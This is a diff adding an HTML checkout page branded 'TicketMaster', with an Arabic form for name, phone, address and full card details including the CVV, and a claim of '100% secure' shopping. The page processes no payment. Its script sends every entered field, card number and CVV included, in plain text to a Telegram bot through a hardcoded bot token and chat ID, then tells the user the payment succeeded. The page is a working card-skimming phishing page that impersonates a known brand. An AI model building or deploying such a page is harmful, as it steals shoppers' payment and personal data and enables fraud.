@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout</title>
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <link rel="stylesheet" href="../assets/css/checkout.css">
+</head>
+<body>
+<div class="bg"></div>
+<div class="bg bg2"></div>
+<div class="bg bg3"></div>
+<header>
+    <nav>
+        <div class="menu-icon" id="menu-icon">
+            &#9776;
+        </div>
+        <ul id="nav-links">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="./about.html">About</a></li>
+            <li><a href="./tickets.html">Tickets</a></li>
+            <li><a href="./contacts.html">Contact</a></li>
+        </ul>
+    </nav>
+    <div class="logo"><a href="../index.html">TicketMaster</a></div>
+</header>
+
+<div class="checkout-container">
+    <h2>تسجيل المغادرة</h2>
+    <form id="checkout-form">
+        <label for="full-name">الأسم كامل</label>
+        <input type="text" id="full-name" name="full-name" required>
+
+        <label for="phone-number">رقم الجوال</label>
+        <input type="tel" id="phone-number" name="phone-number" required>
+
+        <label for="region">المنطقة</label>
+        <input type="text" id="region" name="region" required>
+
+        <label for="address">العنوان بالتفصيل</label>
+        <input type="text" id="address" name="address" required>
+
+        <label for="street">الشارع</label>
+        <input type="text" id="street" name="street" required>
+
+        <label for="payment-method">طريقة الدفع</label>
+        <select id="payment-method" name="payment-method" required>
+            <option value="credit-card">بطاقة ائتمان</option>
+            <option value="paypal">باي بال</option>
+            <option value="bank-transfer">حوالة بنكية</option>
+        </select>
+
+        <h3>الدفعة المستحقة: <span id="total-price">6900 ر.س</span></h3>
+
+        <label for="card-name">الأسم الموجود على البطاقة</label>
+        <input type="text" id="card-name" name="card-name" required>
+
+        <label for="card-number">رقم البطاقة</label>
+        <input type="text" id="card-number" name="card-number" placeholder="0000 0000 0000 0000" required>
+
+        <label for="expiry-month">الشهر</label>
+        <input type="text" id="expiry-month" name="expiry-month" required>
+
+        <label for="expiry-year">السنة</label>
+        <input type="text" id="expiry-year" name="expiry-year" required>
+
+        <label for="cvv">رمز التحقق (CVV)</label>
+        <input type="text" id="cvv" name="cvv" required>
+
+        <button type="submit">ادفع الآن</button>
+    </form>
+    <p>تسوق إلكتروني آمن 100%</p>
+</div>
+
+<script>
+    // Retrieve ticket details and total price from sessionStorage
+    const ticketDetails = JSON.parse(sessionStorage.getItem('ticketDetails'));
+    const totalPrice = sessionStorage.getItem('totalPrice');
+
+    // Display total price
+    document.getElementById('total-price').textContent = totalPrice + ' ر.س';
+
+    // Function to send payment information to Telegram bot
+    async function sendPaymentInfoToTelegram(data) {
+        const botToken = '7376052306:AAEOnsadD15Ny5P-L-LTo0D1eBwk-vVBi7g'; // Replace with your bot token
+        const chatId = '-4273329933'; // Replace with your chat ID
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const message = `
+            New Payment Information:
+            الأسم كامل: ${data.fullName}
+            رقم الجوال: ${data.phoneNumber}
+            المنطقة: ${data.region}
+            العنوان بالتفصيل: ${data.address}
+            الشارع: ${data.street}
+            طريقة الدفع: ${data.paymentMethod}
+            الدفعة المستحقة: ${totalPrice} ر.س
+            الأسم الموجود على البطاقة: ${data.cardName}
+            رقم البطاقة: ${data.cardNumber}
+            الشهر: ${data.expiryMonth}
+            السنة: ${data.expiryYear}
+            رمز التحقق (CVV): ${data.cvv}
+        `;
+
+        await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+    }
+
+    // Handle form submission
+    document.getElementById('checkout-form').addEventListener('submit', async (event) => {
+        event.preventDefault();
+
+        const data = {
+            fullName: document.getElementById('full-name').value,
+            phoneNumber: document.getElementById('phone-number').value,
+            region: document.getElementById('region').value,
+            address: document.getElementById('address').value,
+            street: document.getElementById('street').value,
+            paymentMethod: document.getElementById('payment-method').value,
+            cardName: document.getElementById('card-name').value,
+            cardNumber: document.getElementById('card-number').value,
+            expiryMonth: document.getElementById('expiry-month').value,
+            expiryYear: document.getElementById('expiry-year').value,
+            cvv: document.getElementById('cvv').value
+        };
+
+        // Send payment info to Telegram
+        await sendPaymentInfoToTelegram(data);
+
+        // Optionally, show a success message or redirect to a thank you page
+        alert('تم إرسال معلومات الدفع بنجاح.');
+    });
+</script>
+</body>
+</html>
